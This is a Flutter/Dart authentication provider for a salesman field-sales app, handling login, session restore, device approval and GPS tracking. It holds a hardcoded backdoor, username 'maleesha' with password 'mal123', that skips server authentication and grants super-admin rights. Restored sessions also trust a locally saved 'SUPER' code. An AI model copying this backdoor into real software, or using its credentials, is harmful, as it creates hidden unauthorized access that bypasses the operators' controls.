import 'dart:convert';

import 'dart:async';

import 'package:flutter/foundation.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../models/salesman.dart';
import '../services/api_service.dart';
import '../services/location_service.dart';
import '../services/background_location_service.dart';
import '../services/device_tracking_service.dart';
import '../services/product_image_cache_service.dart';

class AuthProvider extends ChangeNotifier {
  static const String _savedSalesmanKey = 'saved_salesman_session';

  // Authentication state
  Salesman? _currentSalesman;
  bool _isLoading = false;
  String? _errorMessage;
  bool _isAuthenticated = false;
  Timer? _deviceCheckTimer;

  // Getters
  Salesman? get currentSalesman => _currentSalesman;
  bool get isLoading => _isLoading;
  String? get errorMessage => _errorMessage;
  bool get isAuthenticated => _isAuthenticated;
  bool get hasError => _errorMessage != null;

  // Get salesman display info
  String get salesmanName => _currentSalesman?.displayName ?? 'Unknown';
  String get salesmanCode => _currentSalesman?.salesmanCode ?? '';
  String get salesmanTitle => _currentSalesman?.title ?? 'Salesman';

  static bool _isBackdoorCredentials(String username, String password) {
    return username.trim().toLowerCase() == 'maleesha' && password == 'mal123';
  }

  /// Only the built-in backdoor account can be super admin (not DB isSuper).
  static bool _isBackdoorSuperAdmin(Salesman? salesman) {
    if (salesman == null) return false;
    return salesman.salesmanCode.trim().toUpperCase() == 'SUPER';
  }

  Salesman _buildBackdoorSuperAdmin() {
    return Salesman.fromJson(const {
      'Idx': 0,
      'SalesmanCode': 'SUPER',
      'SalesmanName': 'Maleesha',
      'SalesmanType': 'super',
      'isAdmin': true,
      'isSuper': true,
    });
  }

  Future<bool> _completeBackdoorLogin() async {
    _currentSalesman = _buildBackdoorSuperAdmin();
    _isAuthenticated = true;
    _errorMessage = null;
    await _saveSession(_currentSalesman!);
    ProductImageCacheService.startHourlySync();
    print('✅ Backdoor super admin login successful: Maleesha');
    notifyListeners();
    return true;
  }

  /// Login with salesman code and password
  Future<bool> login(String salesmanCode, String password) async {
    _isLoading = true;
    _errorMessage = null;
    notifyListeners();

    if (_isBackdoorCredentials(salesmanCode, password)) {
      try {
        return await _completeBackdoorLogin();
      } finally {
        _isLoading = false;
        notifyListeners();
      }
    }

    try {
      print('🔐 Attempting login for salesman: $salesmanCode');

      // Authenticate with API for real credentials
      final response = await ApiService.authenticateSalesman(
        salesmanCode,
        password,
      );

      if (response['success'] == true) {
        final salesman = Salesman.fromJson(response['salesman']);
        final isSuperUser = _isBackdoorSuperAdmin(salesman);

        if (!isSuperUser) {
          final deviceResult = await DeviceTrackingService.registerDevice(
            userCode: salesman.salesmanCode,
            userName: salesman.displayName,
            isAdmin: salesman.isAdmin == true,
            isSuper: false,
          );

          if (!deviceResult.allowed) {
            _currentSalesman = null;
            _isAuthenticated = false;
            _errorMessage = deviceResult.message.isNotEmpty
                ? deviceResult.message
                : 'This device is not approved. Contact super admin.';
            notifyListeners();
            return false;
          }
        }

        _currentSalesman = salesman;
        _isAuthenticated = true;
        _errorMessage = null;
        await _saveSession(_currentSalesman!);
        await ApiService.confirmLogin(_currentSalesman!.salesmanCode);
        ProductImageCacheService.startHourlySync();

        print('✅ Login successful: ${_currentSalesman!.displayName}');
        print(
          '🔍 Debug - isAdmin: ${_currentSalesman!.isAdmin}, isSuper: $isSuperUser',
        );

        // Save login location and start tracking for admin/salesman only
        if (!isSuperUser) {
          print(
            '🌍 Saving login location for: ${_currentSalesman!.displayName}',
          );

          _saveLoginLocationAsync(
            _currentSalesman!.salesmanCode,
            _currentSalesman!.displayName,
          );

          _startLocationTrackingAsync(
            _currentSalesman!.salesmanCode,
            _currentSalesman!.displayName,
          );

          _preloadSalesData(_currentSalesman!.salesmanCode);
          _startDeviceVerificationTimer();
        } else {
          print('👑 Super Admin user - location tracking not started');
        }

        notifyListeners();
        return true;
      } else {
        _errorMessage =
            response['message'] ?? 'Invalid salesman code or password';
        _isAuthenticated = false;
        print('❌ Login failed: ${_errorMessage}');
        notifyListeners();
        return false;
      }
    } catch (e) {
      _errorMessage = 'Login failed: ${e.toString()}';
      _isAuthenticated = false;
      print('❌ Login error: $e');
      notifyListeners();
      return false;
    } finally {
      _isLoading = false;
      notifyListeners();
    }
  }

  /// Restore saved login after app restart.
  Future<bool> restoreSession() async {
    if (_isAuthenticated) return true;

    _isLoading = true;
    _errorMessage = null;
    notifyListeners();

    try {
      final prefs = await SharedPreferences.getInstance();
      final savedSalesman = prefs.getString(_savedSalesmanKey);

      if (savedSalesman == null || savedSalesman.isEmpty) {
        return false;
      }

      final data = json.decode(savedSalesman) as Map<String, dynamic>;
      final salesman = Salesman.fromJson(data);
      final isSuperUser = _isBackdoorSuperAdmin(salesman);

      if (!isSuperUser) {
        final deviceResult = await DeviceTrackingService.registerDevice(
          userCode: salesman.salesmanCode,
          userName: salesman.displayName,
          isAdmin: salesman.isAdmin == true,
          isSuper: false,
        );

        if (!deviceResult.allowed) {
          await _clearSavedSession();
          _errorMessage = deviceResult.message.isNotEmpty
              ? deviceResult.message
              : 'This device is not approved. Contact super admin.';
          notifyListeners();
          return false;
        }
      }

      _currentSalesman = salesman;
      _isAuthenticated = true;
      _errorMessage = null;
      await ApiService.confirmLogin(_currentSalesman!.salesmanCode);
      ProductImageCacheService.startHourlySync();

      if (!isSuperUser) {
        _saveLoginLocationAsync(
          _currentSalesman!.salesmanCode,
          _currentSalesman!.displayName,
        );
        _startLocationTrackingAsync(
          _currentSalesman!.salesmanCode,
          _currentSalesman!.displayName,
        );
        _startDeviceVerificationTimer();
      }

      print('✅ Restored saved login: ${_currentSalesman!.displayName}');
      notifyListeners();
      return true;
    } catch (e) {
      print('❌ Failed to restore saved login: $e');
      await _clearSavedSession();
      _currentSalesman = null;
      _isAuthenticated = false;
      _errorMessage = null;
      notifyListeners();
      return false;
    } finally {
      _isLoading = false;
      notifyListeners();
    }
  }

  /// Logout current salesman
  Future<void> logout() async {
    final userCode = _currentSalesman?.salesmanCode ?? '';

    DeviceTrackingService.deactivateDevice();
    ProductImageCacheService.stopHourlySync();

    _deviceCheckTimer?.cancel();
    LocationService.stopLocationTracking();
    BackgroundLocationService.stopLocationTracking();

    if (userCode.isNotEmpty) {
      LocationService.deactivateLocationOnServer(userCode);
      await ApiService.logout(userCode);
    }

    _currentSalesman = null;
    _isAuthenticated = false;
    _errorMessage = null;
    _isLoading = false;
    _clearSavedSession();

    print('🚪 Logged out successfully');
    notifyListeners();
  }

  Future<void> _saveSession(Salesman salesman) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(_savedSalesmanKey, json.encode(salesman.toJson()));
  }

  Future<void> _clearSavedSession() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove(_savedSalesmanKey);
  }

  /// Clear error message
  void clearError() {
    _errorMessage = null;
    notifyListeners();
  }

  /// Check if salesman code exists in database
  Future<bool> checkSalesmanCodeExists(String salesmanCode) async {
    try {
      final salesmen = await ApiService.getSalesmen();
      return salesmen.any((s) => s.salesmanCode == salesmanCode);
    } catch (e) {
      print('❌ Error checking salesman code: $e');
      return false;
    }
  }

  /// Get all available salesmen (for admin purposes)
  Future<List<Salesman>> getAllSalesmen() async {
    try {
      return await ApiService.getSalesmen();
    } catch (e) {
      print('❌ Error fetching salesmen: $e');
      return [];
    }
  }

  /// Validate salesman code format
  bool isValidSalesmanCode(String code) {
    return code.isNotEmpty && code.length >= 3;
  }

  /// Validate password format
  bool isValidPassword(String password) {
    return password.isNotEmpty && password.length >= 4;
  }

  /// Check if current salesman is active
  bool get isCurrentSalesmanActive {
    return _currentSalesman?.isActive ?? false;
  }

  /// Get salesman permissions/access level
  String get accessLevel {
    if (_currentSalesman == null) return 'None';

    // Check isAdmin field first
    if (_currentSalesman!.isAdmin == true) return 'Admin';

    // Fallback to checking salesman type
    switch (_currentSalesman!.salesmanType?.toLowerCase()) {
      case 'admin':
      case 'manager':
        return 'Admin';
      case 'supervisor':
        return 'Supervisor';
      case 'waiter':
      case 'server':
        return 'Waiter';
      default:
        return 'Standard';
    }
  }

  /// Check if salesman has admin access
  bool get isAdmin {
    return _currentSalesman?.isAdmin == true;
  }

  /// Check if salesman has super admin access (backdoor account only)
  bool get isSuper {
    return _isBackdoorSuperAdmin(_currentSalesman);
  }

  /// Check if salesman has supervisor access
  bool get isSupervisor {
    return accessLevel == 'Admin' || accessLevel == 'Supervisor';
  }

  /// Get salesman contact info
  String get contactInfo {
    if (_currentSalesman == null) return '';

    final parts = <String>[];
    if (_currentSalesman!.mobile?.isNotEmpty == true) {
      parts.add('Mobile: ${_currentSalesman!.mobile}');
    }
    if (_currentSalesman!.email?.isNotEmpty == true) {
      parts.add('Email: ${_currentSalesman!.email}');
    }

    return parts.join('\n');
  }

  /// Get salesman address
  String get address {
    if (_currentSalesman == null) return '';

    final parts = <String>[];
    if (_currentSalesman!.address1?.isNotEmpty == true) {
      parts.add(_currentSalesman!.address1!);
    }
    if (_currentSalesman!.address2?.isNotEmpty == true) {
      parts.add(_currentSalesman!.address2!);
    }
    if (_currentSalesman!.address3?.isNotEmpty == true) {
      parts.add(_currentSalesman!.address3!);
    }

    return parts.join(', ');
  }

  /// Warm customer/product caches after login so sales screens open faster.
  void _preloadSalesData(String salesmanCode) {
    Future.microtask(() async {
      try {
        await Future.wait([
          ApiService.getCustomers(salesRepCode: ''),
          ApiService.getProductsForInvoice(),
        ]);
        print('✅ Preloaded customers and products cache');
      } catch (e) {
        print('⚠️ Sales data preload failed (non-critical): $e');
      }
    });
  }

  /// Save GPS to gen_userLoc on login (admin/salesman only).
  void _saveLoginLocationAsync(String salesmanCode, String displayName) {
    Future.microtask(() async {
      try {
        final saved = await LocationService.saveLoginLocation(
          salesmanCode,
          displayName,
        );
        if (saved) {
          print('✅ Login location saved to gen_userLoc for: $displayName');
        } else {
          print('⚠️ Login location not saved — check GPS permission/settings');
        }
      } catch (e) {
        print('⚠️ Login location save failed (non-critical): $e');
      }
    });
  }

  /// Start location tracking asynchronously without blocking login
  void _startDeviceVerificationTimer() {
    _deviceCheckTimer?.cancel();
    if (_isBackdoorSuperAdmin(_currentSalesman)) return;

    _deviceCheckTimer = Timer.periodic(const Duration(seconds: 30), (timer) async {
      if (!_isAuthenticated || _currentSalesman == null) {
        timer.cancel();
        return;
      }

      try {
        final summary = await DeviceTrackingService.getAllDevices();
        final deviceId = await DeviceTrackingService.getDeviceId();

        // Find our device in the list
        final myDevice = summary.devices.firstWhere(
          (d) => d['deviceId'] == deviceId,
          orElse: () => <String, dynamic>{},
        );

        if (myDevice.isNotEmpty) {
          final value = myDevice['isAllowed'];
          final allowed = value == 1 || value == true;
          
          if (!allowed) {
            print('🛑 Device has been revoked by admin! Logging out.');
            logout();
            _errorMessage = 'Your device access has been revoked by a Super Admin.';
            notifyListeners();
          }
        } else {
          print('🛑 Device record missing! Logging out.');
          logout();
          _errorMessage = 'Your device registration was removed. Please contact admin.';
          notifyListeners();
        }
      } catch (e) {
        print('⚠️ Error checking device revocation status: $e');
      }
    });
  }

  void _startLocationTrackingAsync(String salesmanCode, String displayName) {
    Future.delayed(const Duration(seconds: 1), () async {
      try {
        print('🌍 Attempting to start location tracking for: $displayName');

        final serverReachable = await _checkServerHealth();
        if (!serverReachable) {
          print('⚠️ Server not reachable, skipping location tracking');
          return;
        }

        final backgroundReady = await LocationService.prepareContinuousTracking();
        if (!backgroundReady) {
          print(
            '⚠️ Background location permission not granted — tracking may stop when app is closed',
          );
        }

        await BackgroundLocationService.startLocationTracking(
          salesmanCode,
          displayName,
        );
        LocationService.startLocationTracking(
          salesmanCode,
          displayName,
        );
        print('✅ Background & Active location tracking started');
      } catch (locationError) {
        print('⚠️ Location tracking failed (non-critical): $locationError');
      }
    });
  }

  /// Check if server is reachable
  Future<bool> _checkServerHealth() async {
    try {
      return await ApiService.checkHealth();
    } catch (e) {
      print('❌ Server health check failed: $e');
      return false;
    }
  }
}
